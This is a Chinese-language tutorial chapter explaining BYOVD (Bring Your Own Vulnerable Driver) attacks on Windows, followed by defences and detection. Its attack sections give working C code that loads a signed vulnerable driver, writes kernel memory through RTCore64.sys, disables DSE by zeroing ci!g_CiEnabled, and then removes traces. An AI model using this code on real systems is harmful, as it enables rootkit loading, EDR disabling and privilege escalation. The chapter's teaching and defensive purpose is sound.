# Ch 35 — BYOVD 攻擊

> 目標：理解 BYOVD（Bring Your Own Vulnerable Driver）攻擊的完整鏈，從找已簽章漏洞驅動到利用它載入未簽章惡意驅動，掌握防禦者的視角。

## 為什麼需要 BYOVD

DSE（Driver Signature Enforcement）在 64-bit Windows 上強制要求驅動必須有有效的數位簽章（見 Ch 24）。

攻擊者繞過方式：

```
攻擊者目標：執行未簽章的惡意核心代碼

直接方式（失敗）：
    載入未簽章驅動 → STATUS_INVALID_IMAGE_HASH ← DSE 擋住

BYOVD 方式（成功）：
    1. 找到已合法簽章但有漏洞的驅動（BYOVD 武器）
    2. 載入漏洞驅動（通過 DSE）
    3. 用漏洞驅動的任意讀/寫原語修改核心
    4. 關閉 DSE 或直接執行惡意代碼
```

## BYOVD 武器庫

已知的 BYOVD 案例（不斷增加）：

| 驅動 | CVE | 漏洞類型 | 濫用方式 |
|-----|-----|---------|---------|
| DBUtil_2_3.sys（Dell BIOS Tool） | CVE-2021-21551 | 任意讀/寫 | APT 在野利用 |
| RTCore64.sys（MSI Afterburner） | N/A | 任意讀/寫 IOCTL | LoJax、BlackByte |
| procexp152.sys（Sysinternals Process Explorer） | N/A | 任意 Handle 操作 | AV 殺進程 |
| gdrv.sys（Gigabyte） | N/A | 任意讀/寫 | Ransomware |
| WinRing0x64.sys（CPU-Z 等） | N/A | I/O Port/物理記憶體讀寫 | 廣泛使用 |
| capcom.sys（Capcom 遊戲） | N/A | 直接執行用戶態 Shellcode | 歷史案例，已撤銷 |

LOLDRIVERS（https://www.loldrivers.io）維護完整清單。

## 攻擊流程

### 步驟 1：載入漏洞驅動

```c
// 攻擊者用標準的 sc.exe 或直接呼叫 NtLoadDriver
// 漏洞驅動是合法簽章的，DSE 不擋

// 安裝驅動服務
SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
SC_HANDLE hSvc = CreateService(
    hSCM,
    L"VulnDrv",                    // 服務名
    L"Vulnerable Driver",
    SERVICE_ALL_ACCESS,
    SERVICE_KERNEL_DRIVER,
    SERVICE_DEMAND_START,
    SERVICE_ERROR_NORMAL,
    L"C:\\Windows\\Temp\\vuln.sys", // 已簽章的漏洞驅動
    NULL, NULL, NULL, NULL, NULL);

StartService(hSvc, 0, NULL);

HANDLE hDev = CreateFile(L"\\\\.\\VulnDrvDevice",
                         GENERIC_READ | GENERIC_WRITE,
                         0, NULL, OPEN_EXISTING, 0, NULL);
```

### 步驟 2：用漏洞建立任意讀/寫原語

以 RTCore64.sys 為例（IOCTL 任意讀/寫）：

```c
// RTCore64 的任意寫 IOCTL（逆向得到的格式）
#define RTCORE64_IOCTL_WRITE 0x8000204C

typedef struct {
    ULONG   unknown1;
    ULONG64 Address;
    ULONG   unknown2;
    ULONG   unknown3;
    ULONG   Value;
    ULONG   padding[3];
} RTCORE64_WRITE_REQUEST;

void RTCore64_WriteKernel(HANDLE hDev, ULONG64 addr, ULONG val)
{
    RTCORE64_WRITE_REQUEST req = { 0 };
    req.Address = addr;
    req.Value   = val;
    
    DWORD bytes;
    DeviceIoControl(hDev, RTCORE64_IOCTL_WRITE,
                    &req, sizeof(req), NULL, 0, &bytes, NULL);
}
```

### 步驟 3：關閉 DSE（或繞過）

**方式 A：修改 `ci!g_CiEnabled`**

Windows 10 的 DSE 由 `ci.dll`（Code Integrity）控制。全域變數 `g_CiEnabled` = 1 表示 DSE 開啟。

```c
// 找 ci.dll 基址（從 PsLoadedModuleList 或 NtQuerySystemInformation）
ULONG64 ciBase = FindModuleBase(L"ci.dll");

// 取 g_CiEnabled 的 RVA（需要符號或逆向）
// 不同版本位置不同，需要版本判斷
ULONG64 gCiEnabledAddr = ciBase + G_CI_ENABLED_OFFSET;

// 用漏洞驅動寫 0 關閉 DSE
RTCore64_WriteKernel(hDev, gCiEnabledAddr, 0);

// 現在可以載入未簽章驅動
NtLoadDriver(&maliciousDriverPath);

// 重新開啟 DSE（可選，降低被發現風險）
RTCore64_WriteKernel(hDev, gCiEnabledAddr, 1);
```

**方式 B：利用漏洞直接執行 Token 竊取（不需要載入額外驅動）**

有任意讀/寫就夠了：
1. 用任意讀找 SYSTEM 進程 Token
2. 用任意寫把 Token 寫入當前進程
3. 直接 SYSTEM，不需要關 DSE

### 步驟 4：清理蹤跡

```c
// 停止並刪除漏洞驅動服務
ControlService(hSvc, SERVICE_CONTROL_STOP, &ssp);
DeleteService(hSvc);

// 刪除驅動檔案
DeleteFile(L"C:\\Windows\\Temp\\vuln.sys");
```

## 完整 BYOVD 攻擊鏈圖

```
攻擊者初始訪問（RCE/本地執行）
         ↓
載入漏洞驅動（已合法簽章，DSE 通過）
         ↓
打開 \\.\ Device Handle → IOCTL 任意讀/寫原語
         ↓
    ┌────┴────┐
    ↓         ↓
關閉 DSE   直接 Token 竊取
    ↓         ↓
載入惡意驅動  SYSTEM 提權
（Rootkit/    ↓
 EDR Killer）繞過 AV/EDR
```

## 防禦

### Microsoft 的防禦

1. **HVCI（Hypervisor-Protected Code Integrity）**：即使 `g_CiEnabled` 被改，Hypervisor 仍要求驅動有有效簽章才能載入——BYOVD 的最強對策。
2. **Vulnerable Driver Blocklist**：Windows 11 + Microsoft 威脅情報維護的已知漏洞驅動黑名單（`DriverSiPolicy.p7b`）。
3. **ASR（Attack Surface Reduction）規則**：WDAC（Windows Defender Application Control）可以封鎖已知漏洞驅動。

### 偵測 BYOVD

```
偵測指標：
1. 罕見的驅動載入事件（事件 ID 6 + 7045）
2. 已知漏洞驅動的哈希（匹配 LOLDRIVERS 清單）
3. 驅動載入後不久有 Token 提權（SYSTEM 進程突然建立）
4. 短暫載入後立刻停止的驅動服務
```

### 更新 Blocklist

```powershell
# 手動觸發更新 Vulnerable Driver Blocklist
Update-DriverBlockPolicy

# 或部署 WDAC 政策
ConvertFrom-CIPolicy -XmlFilePath policy.xml -BinaryFilePath policy.bin
Copy-Item policy.bin "$env:SystemRoot\System32\CodeIntegrity\SIPolicy.p7b"
```

## WinDbg 調查 BYOVD 事件

```
; 查看已載入的驅動（包含時間戳）
kd> lm

; 找到漏洞驅動的記憶體空間
kd> lmvm VulnDrv

; 查它的驗證狀態
kd> !chkimg -d VulnDrv

; 看是否有 PatchGuard 告警或 CI 違規
kd> .lastevent
```

## 自我檢核

- [ ] BYOVD 核心概念：用合法簽章驅動的漏洞建立核心讀/寫，再用它關 DSE 或直接提權
- [ ] RTCore64.sys 等驅動暴露 IOCTL 任意讀/寫，是常見 BYOVD 武器
- [ ] 關 DSE：找 `ci!g_CiEnabled` 地址，寫 0，載入未簽章驅動，寫回 1
- [ ] HVCI 是最強防禦：Hypervisor 層驗證，即使 ci.dll 被 patch 也沒用
- [ ] 偵測：驅動載入/卸載事件 6/7045 + LOLDRIVERS 哈希匹配

→ [Ch 36 ETW 核心追蹤](./36-etw-kernel.md)
